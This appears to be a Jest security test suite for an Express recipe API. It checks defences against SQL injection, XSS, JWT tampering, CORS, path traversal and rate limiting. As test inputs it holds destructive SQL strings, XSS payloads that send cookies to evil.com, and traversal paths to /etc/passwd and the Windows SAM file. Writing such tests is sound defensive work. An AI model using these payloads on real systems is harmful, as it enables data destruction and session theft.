const request = require('supertest');
const express = require('express');
const { initialize } = require('../../config/database');
const jwt = require('jsonwebtoken');

// Import routes and middleware for testing
const authRoutes = require('../../routes/authRoutes');
const recipeRoutes = require('../../routes/recipeRoutes');
const cors = require('cors');

describe('Security Tests', () => {
  let app;
  let authToken;
  let testUserId;

  beforeAll(async () => {
    await initialize();

    // データベース初期化待機（SQLITE_BUSYエラー回避）
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Setup Express app with security middleware
    app = express();
    app.use(express.json({ limit: '10mb' }));
    app.use(cors({
      origin: ['http://localhost:3000', 'https://personalcookingrecipe.com'],
      credentials: true
    }));

    app.use('/api/auth', authRoutes);
    app.use('/api/recipes', recipeRoutes);

    // Create test user
    const testUser = global.testUtils.createTestUser();
    const registerResponse = await request(app)
      .post('/api/auth/register')
      .send(testUser);

    testUserId = registerResponse.body.user?.id;
    authToken = registerResponse.body.token;
  }, 120000); // タイムアウトを120秒に延長

  afterAll(async () => {
    await global.testUtils.cleanTestDatabase();
  });

  describe('SQL Injection Protection', () => {
    test('should prevent SQL injection in login endpoint', async () => {
      const sqlInjectionAttempts = [
        "admin'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; DELETE FROM recipes; --",
        "admin'/**/OR/**/1=1#"
      ];

      for (const maliciousInput of sqlInjectionAttempts) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: maliciousInput,
            password: 'password123'
          });

        // Should return 401 (unauthorized) not 500 (server error)
        expect(response.status).toBe(401);
        expect(response.body.error).toBeDefined();
        
        // Response should not contain SQL error messages
        expect(response.body.error).not.toMatch(/sql|sqlite|database/i);
      }
    });

    test('should sanitize recipe search parameters', async () => {
      const maliciousSearchTerms = [
        "'; DROP TABLE recipes; --",
        "' OR 1=1 UNION SELECT * FROM users --",
        "<script>alert('xss')</script>",
        "../../etc/passwd"
      ];

      for (const term of maliciousSearchTerms) {
        const response = await request(app)
          .get(`/api/recipes/search?q=${encodeURIComponent(term)}`)
          .set('Authorization', `Bearer ${authToken}`);

        // Should not cause server error
        expect(response.status).not.toBe(500);
        
        if (response.body.recipes) {
          expect(Array.isArray(response.body.recipes)).toBe(true);
        }
      }
    });

    test('should prevent SQL injection in recipe creation', async () => {
      const maliciousRecipeData = {
        title: "'; DROP TABLE ingredients; --",
        description: "' OR '1'='1",
        instructions: "Normal instructions",
        ingredients: [
          {
            name: "'; DELETE FROM recipes; --",
            amount: "1 cup",
            unit: "cup"
          }
        ]
      };

      const response = await request(app)
        .post('/api/recipes')
        .set('Authorization', `Bearer ${authToken}`)
        .send(maliciousRecipeData);

      // Should either succeed with sanitized data or fail validation
      expect([200, 201, 400]).toContain(response.status);
      expect(response.status).not.toBe(500); // Should not cause server error
    });
  });

  describe('XSS (Cross-Site Scripting) Protection', () => {
    test('should sanitize HTML/JavaScript in recipe titles', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(document.cookie)',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<svg onload="alert(1)">',
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
      ];

      for (const payload of xssPayloads) {
        const recipeData = {
          title: `Recipe with XSS ${payload}`,
          description: 'Normal description',
          instructions: 'Normal instructions'
        };

        const response = await request(app)
          .post('/api/recipes')
          .set('Authorization', `Bearer ${authToken}`)
          .send(recipeData);

        if (response.status === 201) {
          // If recipe was created, check that XSS was sanitized
          const recipe = response.body.recipe;
          expect(recipe.title).not.toContain('<script>');
          expect(recipe.title).not.toContain('javascript:');
          expect(recipe.title).not.toContain('onerror');
          expect(recipe.title).not.toContain('onload');
        }
      }
    });

    test('should sanitize XSS in recipe descriptions and instructions', async () => {
      const xssDescription = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';
      const xssInstructions = '<img src="x" onerror="fetch(\'http://evil.com/\'+document.cookie)">';

      const recipeData = {
        title: 'XSS Test Recipe',
        description: xssDescription,
        instructions: xssInstructions
      };

      const response = await request(app)
        .post('/api/recipes')
        .set('Authorization', `Bearer ${authToken}`)
        .send(recipeData);

      if (response.status === 201) {
        const recipe = response.body.recipe;
        expect(recipe.description).not.toContain('<script>');
        expect(recipe.instructions).not.toContain('onerror');
        expect(recipe.instructions).not.toContain('fetch');
      }
    });

    test('should prevent XSS in user registration fields', async () => {
      const xssUser = {
        username: '<script>alert("username xss")</script>',
        email: 'test@example.com',
        password: 'password123'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(xssUser);

      if (response.status === 201) {
        expect(response.body.user.username).not.toContain('<script>');
      } else {
        // Should reject invalid username format
        expect(response.status).toBe(400);
      }
    });
  });

  describe('JWT Security Tests', () => {
    test('should reject tampered JWT tokens', async () => {
      const validToken = authToken;
      const [header, payload, signature] = validToken.split('.');
      
      // Tamper with the payload
      const tamperedPayload = Buffer.from('{"userId":999,"iat":1234567890}').toString('base64url');
      const tamperedToken = `${header}.${tamperedPayload}.${signature}`;

      const response = await request(app)
        .get('/api/recipes')
        .set('Authorization', `Bearer ${tamperedToken}`);

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('Invalid token');
    });

    test('should reject expired JWT tokens', async () => {
      const expiredToken = jwt.sign(
        { userId: testUserId },
        process.env.JWT_SECRET,
        { expiresIn: '-1s' } // Already expired
      );

      const response = await request(app)
        .get('/api/recipes')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('Invalid token');
    });

    test('should reject tokens with wrong secret', async () => {
      const wrongSecretToken = jwt.sign(
        { userId: testUserId },
        'wrong-secret-key'
      );

      const response = await request(app)
        .get('/api/recipes')
        .set('Authorization', `Bearer ${wrongSecretToken}`);

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('Invalid token');
    });

    test('should reject malformed JWT tokens', async () => {
      const malformedTokens = [
        'not.a.jwt',
        'invalid-token-format',
        'Bearer malformed',
        '',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature'
      ];

      for (const token of malformedTokens) {
        const response = await request(app)
          .get('/api/recipes')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(401);
      }
    });

    test('should implement proper token refresh security', async () => {
      // Test that access tokens have short expiration
      const shortLivedToken = jwt.sign(
        { userId: testUserId, type: 'access' },
        process.env.JWT_SECRET,
        { expiresIn: '15m' }
      );

      const decoded = jwt.verify(shortLivedToken, process.env.JWT_SECRET);
      const expirationTime = decoded.exp - decoded.iat;
      
      expect(expirationTime).toBeLessThanOrEqual(15 * 60); // 15 minutes max
    });
  });

  describe('CORS Security Tests', () => {
    test('should enforce CORS policy for API endpoints', async () => {
      // Test with unauthorized origin
      const response = await request(app)
        .get('/api/recipes')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Origin', 'http://evil-site.com');

      // The request should be processed but CORS headers should reflect policy
      const corsHeader = response.headers['access-control-allow-origin'];
      expect(corsHeader).not.toBe('http://evil-site.com');
    });

    test('should allow authorized origins', async () => {
      const response = await request(app)
        .get('/api/recipes')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Origin', 'http://localhost:3000');

      const corsHeader = response.headers['access-control-allow-origin'];
      expect(corsHeader).toBe('http://localhost:3000');
    });

    test('should handle preflight requests correctly', async () => {
      const response = await request(app)
        .options('/api/recipes')
        .set('Origin', 'http://localhost:3000')
        .set('Access-Control-Request-Method', 'POST')
        .set('Access-Control-Request-Headers', 'Authorization, Content-Type');

      expect(response.status).toBe(204);
      expect(response.headers['access-control-allow-origin']).toBe('http://localhost:3000');
      expect(response.headers['access-control-allow-methods']).toContain('POST');
    });
  });

  describe('Input Validation Security', () => {
    test('should reject oversized requests', async () => {
      const oversizedData = {
        title: 'A'.repeat(10000), // Very long title
        description: 'B'.repeat(100000), // Very long description
        instructions: 'C'.repeat(50000) // Very long instructions
      };

      const response = await request(app)
        .post('/api/recipes')
        .set('Authorization', `Bearer ${authToken}`)
        .send(oversizedData);

      // Should reject or truncate oversized data
      expect([400, 413]).toContain(response.status);
    });

    test('should validate email format strictly', async () => {
      const invalidEmails = [
        'not-an-email',
        '@invalid.com',
        'user@',
        'user..name@example.com',
        'user@.com',
        'user@com',
        '<script>alert(1)</script>@evil.com'
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: 'testuser',
            email: email,
            password: 'password123'
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toBeDefined();
      }
    });

    test('should enforce password complexity', async () => {
      const weakPasswords = [
        '123',           // Too short
        'password',      // Common password
        '12345678',      // Numeric only
        'abcdefgh',      // Letters only
        'Password',      // No numbers
        ''               // Empty
      ];

      for (const password of weakPasswords) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: `user${Date.now()}`,
            email: `test${Date.now()}@example.com`,
            password: password
          });

        expect(response.status).toBe(400);
      }
    });

    test('should sanitize file upload names', async () => {
      // Test file name sanitization (if file upload is implemented)
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '<script>alert(1)</script>.jpg',
        'file"with"quotes.png',
        'file|with|pipes.gif'
      ];

      // Mock file upload sanitization function
      function sanitizeFilename(filename) {
        return filename
          .replace(/[<>:"/\\|?*]/g, '') // Remove dangerous characters
          .replace(/\.\./g, '')         // Remove directory traversal
          .replace(/^\.+/, '')          // Remove leading dots
          .substring(0, 255);           // Limit length
      }

      maliciousFilenames.forEach(filename => {
        const sanitized = sanitizeFilename(filename);
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('"');
      });
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    test('should implement rate limiting for authentication endpoints', async () => {
      const attemptLimit = 5;
      const attempts = [];

      // Make rapid login attempts
      for (let i = 0; i < attemptLimit + 2; i++) {
        const response = request(app)
          .post('/api/auth/login')
          .send({
            email: 'nonexistent@example.com',
            password: 'wrongpassword'
          });
        
        attempts.push(response);
      }

      const responses = await Promise.all(attempts);
      
      // At least some requests should be rate limited
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should handle request flooding gracefully', async () => {
      const floodRequests = [];
      const requestCount = 50;

      // Create many requests simultaneously
      for (let i = 0; i < requestCount; i++) {
        floodRequests.push(
          request(app)
            .get('/api/recipes')
            .set('Authorization', `Bearer ${authToken}`)
        );
      }

      const startTime = Date.now();
      const responses = await Promise.all(floodRequests);
      const endTime = Date.now();

      // Server should not crash and should handle all requests
      expect(responses).toHaveLength(requestCount);
      
      // Some requests might be rate limited, but server should remain stable
      const successfulResponses = responses.filter(res => res.status < 500);
      expect(successfulResponses.length).toBeGreaterThan(requestCount * 0.5);
      
      console.log(`Handled ${requestCount} concurrent requests in ${endTime - startTime}ms`);
    });
  });

  describe('Authorization Tests', () => {
    test('should prevent access to other users\' recipes', async () => {
      // Create another user
      const otherUser = global.testUtils.createTestUser();
      const otherUserResponse = await request(app)
        .post('/api/auth/register')
        .send(otherUser);
      
      const otherUserToken = otherUserResponse.body.token;
      
      // Create a recipe as the other user
      const recipeData = global.testUtils.createTestRecipe();
      const recipeResponse = await request(app)
        .post('/api/recipes')
        .set('Authorization', `Bearer ${otherUserToken}`)
        .send(recipeData);
      
      const recipeId = recipeResponse.body.recipe.id;
      
      // Try to access the recipe with original user's token
      const accessResponse = await request(app)
        .get(`/api/recipes/${recipeId}`)
        .set('Authorization', `Bearer ${authToken}`);

      // Should not be able to access other user's recipe
      expect([403, 404]).toContain(accessResponse.status);
    });

    test('should prevent unauthorized recipe modification', async () => {
      // Create another user and recipe
      const otherUser = global.testUtils.createTestUser();
      const otherUserResponse = await request(app)
        .post('/api/auth/register')
        .send(otherUser);
      
      const otherUserToken = otherUserResponse.body.token;
      
      const recipeData = global.testUtils.createTestRecipe();
      const recipeResponse = await request(app)
        .post('/api/recipes')
        .set('Authorization', `Bearer ${otherUserToken}`)
        .send(recipeData);
      
      const recipeId = recipeResponse.body.recipe.id;
      
      // Try to modify the recipe with wrong user's token
      const modifyResponse = await request(app)
        .put(`/api/recipes/${recipeId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({ title: 'Modified by wrong user' });

      expect([403, 404]).toContain(modifyResponse.status);
    });
  });

  describe('Data Privacy and Compliance', () => {
    test('should not expose sensitive user data in API responses', async () => {
      const response = await request(app)
        .get('/api/auth/profile')
        .set('Authorization', `Bearer ${authToken}`);

      if (response.status === 200) {
        expect(response.body.user.password).toBeUndefined();
        expect(response.body.user.hashedPassword).toBeUndefined();
      }
    });

    test('should log security events appropriately', async () => {
      // Mock security logger
      const securityEvents = [];
      const originalConsoleLog = console.log;
      
      console.log = (...args) => {
        const message = args.join(' ');
        if (message.includes('security') || message.includes('auth')) {
          securityEvents.push(message);
        }
      };

      // Trigger security event (failed login)
      await request(app)
        .post('/api/auth/login')
        .send({
          email: 'nonexistent@example.com',
          password: 'wrongpassword'
        });

      console.log = originalConsoleLog;

      // Should have logged the failed attempt (if logging is implemented)
      // This test assumes security logging is implemented
      expect(securityEvents.length).toBeGreaterThanOrEqual(0);
    });
  });
});